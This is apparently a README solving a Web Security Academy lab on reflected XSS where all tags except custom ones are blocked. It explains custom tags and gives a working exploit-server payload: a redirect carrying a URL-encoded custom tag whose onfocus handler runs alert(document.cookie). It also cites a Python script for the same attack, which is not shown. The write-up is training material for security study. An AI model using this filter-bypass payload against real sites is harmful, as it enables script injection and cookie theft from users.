# XSS LAB 15 - Reflected XSS into HTML context with all tags blocked except custom ones

## Manual Solution

### 1. What are Custom Tags?
- Custom tags are user-defined HTML tags that are not part of standard HTML.
- These tags can be used when regular JavaScript tags like `<script>` are blocked or filtered by a web application firewall.

### 3. Access the Lab.
- Open the Web Security Academy lab environment in your browser.

### 4. Deliver the Exploit
- Navigate to Exploit Server from the lab homepage.
- Insert the following payload into the body:
  ```js
  <script>
    location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
  </script>
  ```
- Click Store and then Deliver exploit to complete the lab.


## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python xss_lab_15.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
``` 